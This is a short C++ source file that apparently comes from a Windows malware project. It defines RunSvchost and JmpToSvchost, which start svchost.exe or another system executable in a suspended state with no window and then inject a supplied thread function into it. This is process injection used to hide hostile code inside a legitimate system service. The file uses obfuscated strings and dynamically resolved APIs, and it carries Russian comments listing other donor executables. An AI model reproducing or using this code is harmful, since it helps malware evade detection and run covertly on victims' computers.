#include "core\injects.h"
#include "core\debug.h"

DWORD RunSvchost( HANDLE* hprocess, HANDLE* hthread, const char* exeDonor, const char* nameUser )
{
	StringBuilder cmd(512);
	if( !Path::GetSystemDirectore(cmd) ) return false;
	if( exeDonor == 0  || exeDonor[0] == 0 )
		Path::AppendFile( cmd, _CS_( "svchost.exe -k netsvcs" ) );
	else
		if( exeDonor[1] == ':' ) //указан полный путь к ехе
			cmd = exeDonor;
		else
			Path::AppendFile( cmd, exeDonor );
//	Path::AppendFile( cmd, _CS_( "msdtc.exe" ) ); //dialer.exe, wermgr.exe
	DWORD options = CREATE_SUSPENDED | Process::EXEC_NOWINDOW;
	return Process::Exec( options, nameUser, hprocess, hthread, 0, 0, cmd );
}

DWORD JmpToSvchost( typeRunInjectCode funcRunInjectCode, typeInjectCode funcInjectCode, typeFuncThread func, const char* exeDonor, const char* nameUser )
{
	HANDLE hprocess;
	HANDLE hthread;
	DWORD pid = RunSvchost( &hprocess, &hthread, exeDonor, nameUser );
	if( pid )
	{
		if( funcRunInjectCode( hprocess, hthread, func, funcInjectCode ) )
			return pid;
		else
			API(KERNEL32, TerminateThread)( hthread, 0 );
	}
	return 0;
}

DWORD JmpToSvchost( typeFuncThread func, const char* exeDonor, const char* nameUser )
{
	DWORD pid = 0;
	pid = JmpToSvchost2( func, exeDonor, nameUser );
	if( !pid )
	{
		pid = JmpToSvchost1( func, exeDonor, nameUser );
	}
	return pid;
}
